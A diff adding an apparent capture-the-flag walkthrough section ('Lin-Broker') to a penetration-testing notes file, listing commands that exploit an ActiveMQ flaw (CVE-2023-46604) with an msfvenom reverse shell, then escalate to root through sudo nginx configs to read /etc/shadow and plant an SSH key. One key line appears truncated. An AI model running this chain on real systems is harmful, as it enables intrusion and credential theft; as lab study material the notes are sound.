@@ -25,6 +25,34 @@ python -c shell.py
 ```
 
 
+# Lin-Broker
+```
+nmap -sS -sC -sV -T5 -Pn 10.10.11.243
+nmap -p- -T5 10.10.11.243
+10.10.11.243/ | admin:admin
+activemq broker 5.15.15 exploit
+git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4444 -f elf -o test.elf
+python3 -m http.server 8001
+nc -lvvp 4444
+go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.12:8001/poc-linux.xml
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+sudo -l
+python3 -m http.server 80
+wget 10.10.14.12/privesc.conf
+sudo /usr/sbin/nginx -c /tmp/privesc.conf
+curl localhost:1337/etc/shadow
+curl localhost:1337/root/root.txt
+ssh-keygen -o
+wget 10.10.14.12/privesc2.conf
+sudo /usr/sbin/nginx -c /tmp/privesc2.conf
+curl localhost:1338
+curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiHugqsdduKFyMsf1Q3e75saE~~~M0swOE2pXf9C5TOU92CZM= root@kali'
+<veSLNQaxZV8H8UXg8uM0swOE2pXf9C5TOU92CZM= root@kali'
+ssh -i /root/.ssh/id_rsa root@10.10.11.243
+```
+
+
 # Lin-Haircut
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.24/FUZZ -e .aspx,.php,.txt,.html,.sh
